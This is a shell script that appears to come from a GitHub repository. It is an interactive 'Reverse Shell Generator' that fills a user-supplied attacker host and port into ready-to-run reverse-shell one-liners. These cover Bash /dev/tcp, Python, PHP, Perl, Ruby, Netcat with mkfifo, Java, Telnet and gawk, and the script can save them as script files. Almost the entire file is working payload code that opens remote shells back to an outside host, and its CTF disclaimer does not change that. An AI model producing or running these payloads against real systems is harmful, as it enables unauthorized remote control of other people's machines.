#!/bin/sh

echo "########## Created by 0xpr0N3rd (GitHub) ##########\n\n"
# Cheat sheets from PentestMoney, Highon.Coffe and GTFOBins are used in this script. 

echo "DISCLAIMER!!! This tool is developed only for legal purposes, such as CTFs. Developer does not take any responsibility in any kind of illegal usage.\n\n" 
echo "##### Reverse Shell Generator v1.0 #####\n\n"

echo "Select the shell type you want to generate. Here are the types currently supported:"
echo "\n### Bash, Python/3, PHP, Perl, Ruby, Netcat, Java, Telnet, Gawk ###"

generateShell () {
	echo "\nJust select one of them and let the magic happen (it's not case sensitive): "; read type # well, i tried to handle most of the cases
	
	dqt='"' 		# hold double quotation char
	dsg='$' 		# hold dollar sign char
	hold_i='i' 		# hold i char
	hold_p='p' 	 	# hold p char
	hold_c='c'		# hold c char
	hold_tcp='tcp' 	 	# hold tcp string
	hold_line='line'	# hold line string
	bsh='\' 		# hold backslash
	exec='exec' 		# hold exec string
	eq='='			# hold = char
	zero='0'		# hold 0 number
	RRHOST='RHOST'		# hold RHOST string
	RRPORT='RPORT'		# hold RPORT string
	hold_='_'		# hold _ char

	case $type in
		bash | BASH | bASH | Bash) 				# check if it's Bash
		echo "\nAlright, you have selected Bash."
		echo "Enter LHOST: "; read LHOST
		echo "Enter LPORT: "; read LPORT
		echo "\nHold on. There are a couple of options for this one. Select the type you want from below:"
		echo "\n\n1 - Do you want it to be in $dqt bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1 $dqt format?"
		echo "2 - Do you want it to be in $dqt 0<&196;exec 196<>/dev/tcp/<LHOST>/<LPORT>; sh <&196 >&196 2>&196 $dqt format?"
		echo "3 - Do you want it to be in $dqt while $dqt format?"
		echo "\nSeriously, just select 1, 2 or 3:"; read answer
		
		checkAnswer() {
			case $answer in
				1)
				echo "One last thing. Just tell me whether you want it to be outputted as text on terminal or saved as a file? (text/file):"; read select
				
				case $select in		
					text | TEXT)
					echo "\nThere you go buddy:"
					echo "\nbash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"			
					;;
					
					file | FILE)
					echo "Enter output file name: (without '.sh')"; read outputName
					echo "\nThere you go buddy, your file is saved as "$outputName.sh" in your current directory. ($PWD)"
					echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" > $outputName.sh
					eval ls -la $outputName.sh
					echo "\nContent of $outputName.sh:"
					eval cat $outputName.sh
					;;
					
					*)
					echo "\nWrong format, pal. Hit it again:"
					checkAnswer
					;;
				esac
				;;
				
				2)
				echo "One last thing. Just tell me whether you want it to be outputted as text on terminal or saved as a file? (text/file):"; read select
				
				case $select in		
					text | TEXT)
					echo "\nThere you go buddy:"
					echo "\n0<&196;exec 196<>/dev/tcp/$LHOST/$LPORT; sh <&196 >&196 2>&196"			
					;;
					
					file | FILE)
					echo "Enter output file name: (without '.sh')"; read outputName
					echo "\nThere you go buddy, your file is saved as "$outputName.sh" in your current directory. ($PWD)"
					echo "0<&196;exec 196<>/dev/tcp/$LHOST/$LPORT; sh <&196 >&196 2>&196" > $outputName.sh
					eval ls -la $outputName.sh
					echo "\nContent of $outputName.sh:"
					eval cat $outputName.sh
					;;
					
					*)
					echo "\nWrong format, pal. Hit it again:"
					checkAnswer
					;;
				esac
				;;
				
				3)
				echo "One last thing. Just tell me whether you want it to be outputted as text on terminal or saved as a file? (text/file):"; read select
				
				case $select in		
					text | TEXT)
					echo "\nThere you go buddy:"
					echo "\nexec 5<>/dev/tcp/$LHOST/$LPORT"
					echo "cat <&5 | while read line; do $dsg$hold_line 2>&5 >&5; done"			
					;;
					
					file | FILE)
					echo "Enter output file name: (without '.sh')"; read outputName
					echo "\nThere you go buddy, your file is saved as "$outputName.sh" in your current directory. ($PWD)"
					echo "exec 5<>/dev/tcp/$LHOST/$LPORT" > $outputName.sh
					echo "cat <&5 | while read line; do $dsg$hold_line 2>&5 >&5; done" >> $outputName.sh
					eval ls -la $outputName.sh
					echo "\nContent of $outputName.sh:"
					eval cat $outputName.sh
					;;
					
					*)
					echo "\nWrong format, pal. Hit it again:"
					checkAnswer
					;;
				esac
				;;
				
				*)

				while [  $answer > 3  ]; do
					echo "Hmm, someone's really curious. Unfortunately, there are no any other types present at the moment. Enter again:"; read answer
					if [ $answer -le 3 ];then
						checkAnswer
						break
					fi
				done 
				;;
			esac 
		}; checkAnswer
		;;
		
		python | PYTHON | pYTHON | Python) 			# check if it's Python
		echo "\nAlright, you have selected Python."
		echo "Enter LHOST: "; read LHOST
		echo "Enter LPORT: "; read LPORT
		
		checkAnswer() {
			echo "One last thing. Just tell me whether you want it to be outputted as text on terminal or saved as a file? (text/file):"; read answer
			
			case $answer in
				text | TEXT)
				echo "\nThere you go buddy:"
				echo "\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(($dqt$LHOST$dqt,$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([$dqt/bin/sh$dqt,$dqt-i$dqt]);'"			
				;;
				
				file | FILE)
				echo "Enter output file name: (without '.py')"; read outputName
				echo "\nThere you go buddy, your file is saved as "$outputName.py" in your current directory. ($PWD)"
				echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(($dqt$LHOST$dqt,$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([$dqt/bin/sh$dqt,$dqt-i$dqt]);'" > $outputName.py
				eval ls -la $outputName.py
				echo "\nContent of $outputName.py:"
				eval cat $outputName.py
				;;
				
				*)
				echo "\nWrong format, pal. Hit it again:"
				checkAnswer
				;;
			esac
		}; checkAnswer
		;;
		
		python3 | PYTHON3 | pYTHON3 | Python3) 			# check if it's Python3
		echo "\nAlright, you have selected Python3."
		echo "Enter LHOST: "; read LHOST
		echo "Enter LPORT: "; read LPORT
	
		checkAnswer() {
			echo "One last thing. Just tell me whether you want it to be outputted as text on terminal or saved as a file? (text/file):"; read answer
			
			case $answer in
				text | TEXT)
				echo "\nThere you go buddy:"
				echo "\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(($dqt$LHOST$dqt,$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([$dqt/bin/sh$dqt,$dqt-i$dqt]);'"			
				;;
				
				file | FILE)
				echo "Enter output file name: (without '.py')"; read outputName
				echo "\nThere you go buddy, your file is saved as "$outputName.py" in your current directory. ($PWD)"
				echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(($dqt$LHOST$dqt,$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([$dqt/bin/sh$dqt,$dqt-i$dqt]);'" > $outputName.py
				eval ls -la $outputName.py
				echo "\nContent of $outputName.py:"
				eval cat $outputName.py
				;;
				
				*)
				echo "\nWrong format, pal. Hit it again:"
				checkAnswer
				;;
			esac
		}; checkAnswer
		;;
		
		php | PHP | pHP | Php)					# check if it's PHP
		echo "\nAlright, you have selected PHP."
		echo "Enter LHOST: "; read LHOST
		echo "Enter LPORT: "; read LPORT
		
		checkAnswer() {
			echo "One last thing. Just tell me whether you want it to be outputted as text on terminal or saved as a file? (text/file):"; read answer
			
			case $answer in
				text | TEXT)
				echo "\nThere you go buddy:"
				echo "\nphp -r '$dsg$sock=fsockopen($dqt$LHOST$dqt,$LPORT);exec($dqt/bin/sh -i <&3 >&3 2>&3$dqt);'"			
				;;
				
				file | FILE)
				echo "Enter output file name: (without '.php')"; read outputName
				echo "\nThere you go buddy, your file is saved as "$outputName.php" in your current directory. ($PWD)"
				echo "php -r '$dsg$sock=fsockopen($dqt$LHOST$dqt,$LPORT);exec($dqt/bin/sh -i <&3 >&3 2>&3$dqt);'" > $outputName.php
				eval ls -la $outputName.php
				echo "\nContent of $outputName.php:"
				eval cat $outputName.php
				;;
				
				*)
				echo "\nWrong format, pal. Hit it again:"
				checkAnswer
				;;
			esac
		}; checkAnswer
		;;
		
		perl | PERL | pERL | Perl)				# check if it's Perl
		echo "\nAlright, you have selected Perl."
		echo "Enter LHOST: "; read LHOST
		echo "Enter LPORT: "; read LPORT
		echo "\nHold on. There are a couple of options for this one. Select the type you want from below:"
		echo "\n\n1 - Do you want it as a Linux Reverse Shell?"
		echo "2 - Do you want it as a Windows Reverse Shell?"
		echo "\nSeriously, just select 1 or 2:"; read answer
		
		checkAnswer() {
			case $answer in
				1)
				echo "One last thing. Just tell me whether you want it to be outputted as text on terminal or saved as a file? (text/file):"; read select
				
				case $select in
					text | TEXT)
					echo "\nThere you go buddy:"
					echo "\nperl -e 'use Socket;$dsg$hold_i=$dqt$LHOST$dqt;$dsg$hold_p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname($dqt$hold_tcp$dqt));if(connect(S,sockaddr_in($dsg$hold_p,inet_aton($dsg$hold_i)))){open(STDIN,$dqt>&S$dqt);open(STDOUT,$dqt>&S$dqt);open(STDERR,$dqt>&S$dqt);exec($dqt/bin/sh -i$dqt);};'"			
					;;
					
					file | FILE)
					echo "Enter output file name: (without '.pl')"; read outputName
					echo "\nThere you go buddy, your file is saved as "$outputName.pl" in your current directory. ($PWD)"
					echo "\nperl -e 'use Socket;$dsg$hold_i=$dqt$LHOST$dqt;$dsg$hold_p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname($dqt$hold_tcp$dqt));if(connect(S,sockaddr_in($dsg$hold_p,inet_aton($dsg$hold_i)))){open(STDIN,$dqt>&S$dqt);open(STDOUT,$dqt>&S$dqt);open(STDERR,$dqt>&S$dqt);exec($dqt/bin/sh -i$dqt);};'" > $outputName.pl
					eval ls -la $outputName.pl
					echo "\nContent of $outputName.pl:"
					eval cat $outputName.pl
					;;
					
					*)
					echo "\nWrong format, pal. Hit it again:"
					checkAnswer
					;;
				esac
				;;
				
				2)
				echo "I hate to do this to you but there are multiple options for this one too :/"
				echo "\n\n1 - Do you want it in $dqt MIO $dqt format?"
				echo "2 - Do you want it in the $dqt normal $dqt format?"
				echo "\nSelect 1 or 2 for the last time:"; read answer
				
				case $answer in
					1)
					echo "One last thing. Just tell me whether you want it to be outputted as text on terminal or saved as a file? (text/file):"; read select
					
					case $select in
						text | TEXT)
						echo "\nThere you go buddy:"
						echo "\nperl -MIO -e '$dsg$hold_c=new IO::Socket::INET(PeerAddr,$dsg$LHOST:$LPORT$dsg);STDIN->fdopen($dsg$hold_c,r);$dsg~->fdopen($dsg$hold_c,w);system$dsg$hold_ while<>;'"			
						;;
						
						file | FILE)
						echo "Enter output file name: (without '.pl')"; read outputName
						echo "\nThere you go buddy, your file is saved as "$outputName.pl" in your current directory. ($PWD)"
						echo "perl -MIO -e '$dsg$hold_c=new IO::Socket::INET(PeerAddr,$dsg$LHOST:$LPORT$dsg);STDIN->fdopen($dsg$hold_c,r);$dsg~->fdopen($dsg$hold_c,w);system$dsg$hold_ while<>;'" > $outputName.pl
						eval ls -la $outputName.pl
						echo "\nContent of $outputName.pl:"
						eval cat $outputName.pl
						;;
						
						*)
						echo "\nWrong format, pal. Hit it again:"
						checkAnswer
						;;
					esac
					;;
					
					2)
					echo "One last thing. Just tell me whether you want it to be outputted as text on terminal or saved as a file? (text/file):"; read select
					
					case $select in
						text | TEXT)
						echo "\nThere you go buddy:"
						echo "\nperl -e 'use Socket;$dsg$hold_i=$dsg$LHOST$dsg;$dsg$hold_p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname($dsg$hold_tcp$dsg));if(connect(S,sockaddr_in($dsg$hold_p,inet_aton($dsg$hold_i)))){open(STDIN,$dsg>&S$dsg);open(STDOUT,$dsg>&S$dsg);open(STDERR,$dsg>&S$dsg);exec($dsg/bin/sh -i$dsg);};'"			
						;;
						
						file | FILE)
						echo "Enter output file name: (without '.pl')"; read outputName
						echo "\nThere you go buddy, your file is saved as "$outputName.pl" in your current directory. ($PWD)"
						echo "perl -e 'use Socket;$dsg$hold_i=$dsg$LHOST$dsg;$dsg$hold_p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname($dsg$hold_tcp$dsg));if(connect(S,sockaddr_in($dsg$hold_p,inet_aton($dsg$hold_i)))){open(STDIN,$dsg>&S$dsg);open(STDOUT,$dsg>&S$dsg);open(STDERR,$dsg>&S$dsg);exec($dsg/bin/sh -i$dsg);};'" > $outputName.pl
						eval ls -la $outputName.pl
						echo "\nContent of $outputName.pl:"
						eval cat $outputName.pl
						;;
						
						*)
						echo "\nWrong format, pal. Hit it again:"
						checkAnswer
						;;
					esac
					;;
				
					*)
					while [  $answer > 2  ]; do
						echo "Hmm, someone's really curious. Unfortunately, there are no any other types present at the moment. Enter again:"; read answer
						if [ $answer -le 2 ];then
							checkAnswer
							break
						fi
					done 
					;;
				esac
				;;
				
				*)
				while [  $answer > 2  ]; do
					echo "Hmm, someone's really curious. Unfortunately, there are no any other types present at the moment. Enter again:"; read answer
					if [ $answer -le 2 ];then
						checkAnswer
						break
					fi
				done 
				;;
			esac
		}; checkAnswer
		;;
		
		ruby | RUBY | rUBY | Ruby)				# check if it's Ruby
		echo "\nAlright, you have selected Ruby."
		echo "Enter LHOST: "; read LHOST
		echo "Enter LPORT: "; read LPORT
		
		checkAnswer() {
			echo "One last thing. Just tell me whether you want it to be outputted as text on terminal or saved as a file? (text/file):"; read answer
			
			case $answer in
				text | TEXT)
				echo "\nThere you go buddy:"
				echo "\nruby -rsocket -e'f=TCPSocket.open($dqt$LHOST$dqt,$LPORT).to_i;exec sprintf($dqt/bin/sh -i <&%d >&%d 2>&%d$dqt,f,f,f)'"			
				;;
				
				file | FILE)
				echo "Enter output file name: (without '.rb')"; read outputName
				echo "\nThere you go buddy, your file is saved as "$outputName.rb" in your current directory. ($PWD)"
				echo "\nruby -rsocket -e'f=TCPSocket.open($dqt$LHOST$dqt,$LPORT).to_i;exec sprintf($dqt/bin/sh -i <&%d >&%d 2>&%d$dqt,f,f,f)'" > $outputName.rb
				eval ls -la $outputName.rb
				echo "\nContent of $outputName.rb:"
				eval cat $outputName.rb
				;;
				
				*)
				echo "\nWrong format, pal. Hit it again:"
				checkAnswer
				;;
			esac
		}; checkAnswer
		;;
		
		nc | NC | nC | Nc | netcat | NETCAT | nETCAT | Netcat)	# check if it's Netcat
		echo "\nAlright, you have selected Netcat."
		echo "Enter LHOST: "; read LHOST
		echo "Enter LPORT: "; read LPORT
		echo "\nHold on. There are a couple of options for this one. Select the type you want from below:"
		echo "\n\n1 - Do you want it to be in $dqt nc -e /bin/sh <LHOST> <LPORT> $dqt format?"
		echo "2 - Do you want it to be in $dqt /bin/sh | nc <LHOST> <LPORT> $dqt format?"
		echo "3 - Do you want it to be in $dqt rm -f /tmp/p; mknod /tmp/p p && nc <LHOST> <LPORT> 0/tmp/p $dqt format?"
		echo "4 - Do you want it to be in $dqt rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f $dqt format?"
		echo "\nSeriously, just select 1, 2, 3 or 4:"; read answer
		
		checkAnswer() {	
			case $answer in
				1)
				echo "\nThere you go buddy:"
				echo "\nnc -e /bin/sh $LHOST $LPORT"
				;;
				
				2)
				echo "\nThere you go buddy:"
				echo "\n/bin/sh | nc $LHOST $LPORT"
				;;
				
				3)
				echo "\nThere you go buddy:"
				echo "\nrm -f /tmp/p; mknod /tmp/p p && nc $LHOST $LPORT 0/tmp/p"
				;;
				
				4)
				echo "\nThere you go buddy:"
				echo "\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f"
				;;
				
				*)

				while [  $answer > 4  ]; do
					echo "Hmm, someone's really curious. Unfortunately, there are no any other types present at the moment. Enter again:"; read answer
					if [ $answer -le 4 ];then
						checkAnswer
						break
					fi
				done 
				;;
			esac
		}; checkAnswer
		;;
		
		java | JAVA | jAVA | Java)		# check if it's Java
		echo "\nAlright, you have selected Java."
		echo "Enter LHOST: "; read LHOST
		echo "Enter LPORT: "; read LPORT
	
		checkAnswer() {
			echo "One last thing. Just tell me whether you want it to be outputted as text on terminal or saved as a file? (text/file):"; read answer
			
			case $answer in
				text | TEXT)
				echo "\nThere you go buddy:"
				echo "\nr = Runtime.getRuntime()"
				echo "p = r.exec([$dqt/bin/bash$dqt,$dqt-c$dqt,$dqt$exec 5<>/dev/tcp/$LHOST/$LPORT;cat <&5 | while read line; do $bsh$dsg$hold_line 2>&5 >&5; done$dqt] as String[])"
				echo "p.waitFor()"			
				;;
				
				file | FILE)
				echo "Enter output file name: (without '.java')"; read outputName
				echo "\nThere you go buddy, your file is saved as "$outputName.java" in your current directory. ($PWD)"
				echo "\nr = Runtime.getRuntime()" > $outputName.java
				echo "p = r.exec([$dqt/bin/bash$dqt,$dqt-c$dqt,$dqt$exec 5<>/dev/tcp/$LHOST/$LPORT;cat <&5 | while read line; do $bsh$dsg$hold_line 2>&5 >&5; done$dqt] as String[])" >> $outputName.java
				echo "p.waitFor()" >> $outputName.java
				eval ls -la $outputName.java 
				echo "\nContent of $outputName.java:"
				eval cat $outputName.java
				;;
				
				*)
				echo "\nWrong format, pal. Hit it again:"
				checkAnswer
				;;
			esac
		}; checkAnswer
		;;
		
		telnet | TELNET | tELNET | Telnet)	# check if it's Telnet
		echo "\nAlright, you have selected Telnet."
		echo "Enter LHOST: "; read LHOST
		echo "Enter LPORT: "; read LPORT
		echo "\nHold on. There are a couple of options for this one. Select the type you want from below:"
		echo "\n\n1 - Do you want it to be in $dqt rm -f /tmp/p; mknod /tmp/p p && telnet <LHOST> <LPORT> 0/tmp/p $dqt format?"
		echo "2 - Do you want it to be in $dqt telnet <LHOST> <LPORT> | /bin/bash | telnet <LHOST> 443 $dqt format?"
		echo "\nSeriously, just select 1 or 2:"; read answer
		
		checkAnswer() {
			case $answer in
				1)
				echo "\nThere you go buddy:"
				echo "\nrm -f /tmp/p; mknod /tmp/p p && telnet $LHOST $LPORT 0/tmp/p"
				;;
				
				2)
				echo "\nThere you go buddy:"
				echo "\ntelnet $LHOST $LPORT | /bin/bash | telnet $LHOST 443"
				echo "\n\nATTENTION! Dont forget to listen 443 port on your LHOST=$LHOST for this one ;)"
				;;
				
				*)

				while [  $answer > 2  ]; do
					echo "Hmm, someone's really curious. Unfortunately, there are no any other types present at the moment. Enter again:"; read answer
					if [ $answer -le 2 ];then
						checkAnswer
						break
					fi
				done 
				;;
			esac
		}; checkAnswer
		;;
		
		gawk | GAWK | gAWK | Gawk)		# check if it's Gawk
		echo "Alright, you have selected Gawk."
		echo "\nHold on. There are a couple of options for this one. Select the type you want from below:"
		echo "\n\n1 - Do you want it to be in $dqt Non-interactive reverse shell $dqt format?"
		echo "\n2 - Do you want it to be in $dqt Non-interactive bind shell $dqt format?"
		echo "\nSeriously, just select 1 or 2:"; read answer
		
		checkAnswer() {
			case $answer in
				1)
				echo "\nEnter RHOST:"; read RHOST
				echo "\nEnter RPORT:"; read RPORT
				echo "\nThere you go buddy:"
				echo "\nRHOST=$RHOST"
				echo "RPORT=$RPORT"
				echo "gawk -v RHOST=$dsg$RRHOST -v RPORT=$dsg$RRPORT 'BEGIN {"
				echo "	s = $dqt/inet/tcp/0$dqt RHOST $dqt/$dqt RPORT;"
				echo "	while (1) {printf $dqt> $dqt |& s; if((s |& getline c)<$eq 0) break;"
				echo "	while (c && (c |& getline) > 0) print $dsg$zero |& s; close(c)}}'"
				echo "\n\n\nDon't forget to set your $dqt nc -l -p $RPORT $dqt :)"
				;;
				
				2)
				echo "\nEnter LPORT:"; read LPORT
				echo "\nLPORT=$LPORT"
				echo "gawk -v LPORT=$LLPORT 'BEGIN {"
				echo "	s = $dqt/inet/tcp/$dqt LPORT $dqt/0/0$dqt;"
				echo "	while (1) {printf $dqt> $dqt |& s; if ((s |& getline c) <$eq 0) break;"
				echo "	while (c && (c |& getline) > 0) print $dsg$zero |& s; close(c)}}'"
				echo "\n\n\nDon't forget to run $dsg nc <RHOST> $LPORT $dsg for this one :)"
				;;
				
				*)

				while [  $answer > 2  ]; do
					echo "Hmm, someone's really curious. Unfortunately, there are no any other types present at the moment. Enter again:"; read answer
					if [ $answer -le 2 ];then
						checkAnswer
						break
					fi
				done 
				;;
			esac
		}; checkAnswer
		;;
		
		*)
		echo "Woops! I guess you meant to write something else. Are you sure you want to select that one? (y/N):"; read decision
		
		case $decision in
			y | Y)
			eval clear
			echo "root@0xpr0N3rd:~# cat root.txt"
			echo "Congratz! You pwned 0xpr0N3rd!!!\n\n\n\n"
			echo "Just kidding you dummy, you have selected a wrong option."
			;;
			
			n | N)
			echo "Alright buddy, hit it again :) "
			generateShell
			;;
			
			*)
			echo "\n\nYou leave me no chance but terminating the program, sorry dude."
			echo "\n\n##### Program terminated. #####"
			exit 1
			;;
		esac
		;; 
	esac
	
	echo "\n\n\n\n\n##### Program terminated. #####"
	exit 1
}; generateShell
